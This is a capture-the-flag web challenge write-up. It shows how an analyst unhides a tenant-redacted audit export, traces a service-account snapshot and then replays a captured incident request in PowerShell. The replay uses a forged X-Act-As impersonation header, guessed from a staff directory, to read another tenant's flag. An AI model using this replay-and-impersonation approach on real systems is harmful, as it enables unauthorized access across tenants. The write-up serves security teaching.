# No Humans Were Logged In

| | |
|---|---|
| **Category** | Web |
| **Points** | 50 |
| **Author** | Anonymous |
| **Solves** | 44 |
| **Files** | — (remote only) |

## Challenge

> The tenant audit says no administrator entered, but support replay counters disagree. Investigate the missing incident token.

Targets:
```
http://45.77.247.35:22009
http://5.223.64.53:22009
```

## Recon

The homepage is **ContinuityDesk**, a "tenant incident support" web app with an analyst login (`analyst@harbor.local`) and a public company microsite at `/company`.

Once signed in, the dashboard surfaces two API links and a hint about the data model:

```
/api/audit/recent
/api/tickets
```

> "The browser only renders the tenant view. The export API returns metadata about other available views."

### `/api/audit/recent`

The default (tenant-scoped) view returns audit rows and a `meta` block that gives the game away:

```json
"meta": {
  "available_views": ["tenant", "export"],
  "export_url": "/api/audit/recent?view=export",
  "redaction_model": "foreign export rows preserve correlation fields only",
  "tenant_view_omitted_foreign_rows": 4
}
```

The tenant view is silently dropping 4 rows belonging to other tenants/correlation contexts.

### `/api/tickets`

The list view redacts a `support` field (`"support": null` on every row) but exposes a reference-lookup template:

```json
"templates": { "by_ref": "/api/tickets/ref/{ref}" }
```

### `/company`

The public staff directory gives a handle convention: **first initial + family name, lowercase, stripped** (e.g. Dev Patel → `dpatel`). This becomes important later for decoding a masked actor handle.

## Unredacting the audit log

Requesting the export view:

```
GET /api/audit/recent?view=export
```

returns the 4 previously-hidden rows, with `tenant_view_omitted_foreign_rows` now at 0. Two of them are explicitly labeled decoys (`trace_id: tr_decoy...`). The real one:

```json
{
  "event": "snapshot_created",
  "ticket": "MER-2026-9F2C7A84E6B1",
  "actor": "svc_snapshot",
  "human_admin": false,
  "route": "incident_review",
  "trace_id": "tr_6f4d220901db85c42a73"
}
```

This is the answer to the challenge's framing: the tenant audit shows no *human* admin login because the action was performed by a **service account** (`svc_snapshot`) doing an automated incident-review snapshot — not a normal login event.

## Following the ticket

Using the ref-lookup template from `/api/tickets`:

```
GET /api/tickets/ref/MER-2026-9F2C7A84E6B1
```

```json
{
  "title": "Admin incident review snapshot",
  "status": "locked",
  "severity": "critical",
  "support": {
    "capture_policy": "support snapshots preserve browser route context, not only screenshots.",
    "snapshot_id": "snap-7c01b54e9af87d2036ea",
    "manifest": "/api/snapshots/snap-7c01b54e9af87d2036ea/manifest?kid=k_1d8bc754e63f20a9476bd38c5e0f12a4"
  }
}
```

## The snapshot manifest

```
GET /api/snapshots/snap-7c01b54e9af87d2036ea/manifest?kid=k_1d8bc754e63f20a9476bd38c5e0f12a4
```

```json
{
  "bundle": "continuitydesk-support-v3",
  "created_by": "svc_snapshot@merlion.local",
  "fragments": [
    { "kind": "browser-visible-state",   "name": "ui" },
    { "kind": "captured-request-context","name": "request" },
    { "kind": "client-routing-cache",    "name": "storage" }
  ],
  "redaction": "presentation fragments mask human handles; request routing remains intact"
}
```

The key line: the **UI** fragment is redacted for human handles, but the **request** fragment (routing data) is not.

## The request fragment

```
GET /api/snapshots/snap-7c01b54e9af87d2036ea/fragments/request?kid=k_1d8bc754e63f20a9476bd38c5e0f12a4
```

```json
{
  "method": "GET",
  "path": "/api/incidents/by-code/MW-9001",
  "headers": [
    { "name": "X-Support-Replay", "value": "srp_v3_d2f0943eaa52c7b910864fd09e83b6ac" },
    { "name": "X-Replay-Trace",   "value": "tr_6f4d220901db85c42a73" },
    { "name": "X-Tenant-Slug",    "value": "merlion" },
    { "name": "X-Act-As",         "value": "i***", "masked": true }
  ],
  "note": "Support replay preserved a service route through the incident API, but the target human handle was masked by the UI layer."
}
```

This captured the exact service-account request that reached the real incident. The `X-Act-As` header is masked to `i***` by the UI layer only — the raw value isn't actually needed, since the company page's handle convention (first initial + family name) narrows it down: of the staff listed, only **Iris Tan — "Approves privileged incident reviews"** fits an incident-review action, giving handle `itan`.

## Replaying the request

Replaying the captured request with a valid analyst session cookie plus the harvested headers:

```powershell
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$cookie = New-Object System.Net.Cookie(
  "session", "<analyst session cookie value>", "/", "45.77.247.35"
)
$session.Cookies.Add($cookie)

Invoke-RestMethod -Uri "http://45.77.247.35:22009/api/incidents/by-code/MW-9001" `
  -WebSession $session `
  -Headers @{
    "X-Support-Replay" = "srp_v3_d2f0943eaa52c7b910864fd09e83b6ac"
    "X-Replay-Trace"   = "tr_6f4d220901db85c42a73"
    "X-Tenant-Slug"    = "merlion"
    "X-Act-As"         = "itan"
  }
```

> Note: `Invoke-RestMethod -Headers` with a manually-set `Cookie` key is unreliable — PowerShell's HTTP client manages cookies through its own container and can silently drop it. Use a `WebSession` with `System.Net.Cookie` added directly instead.

Response:

```yaml
actor:            itan
human_admin_login: False
id:               9001
incident_token:   CYBLTZ2026{s3rv1c3_4cc0un75_l34v3_hum4n_5h4D0w5}
public_code:      MW-9001
tenant:           merlion
title:            Merlion Wing Privileged Incident
```

## Flag

```
CYBLTZ2026{s3rv1c3_4cc0un75_l34v3_hum4n_5h4D0w5}
```

## Takeaways

- Tenant-scoped views can leak their own existence via metadata (`available_views`, omitted-row counts) — always check for an alternate "export"/"admin" view parameter.
- "Redaction" is often partial by design: presentation layers may mask a field while an underlying data/routing layer still carries it.
- Service-account activity (`human_admin: false`) explains audit-log gaps that look like "nobody logged in" — it's a different actor type, not an absent one.
- When replaying captured requests, remember the client also needs a valid session; the custom headers alone aren't sufficient.
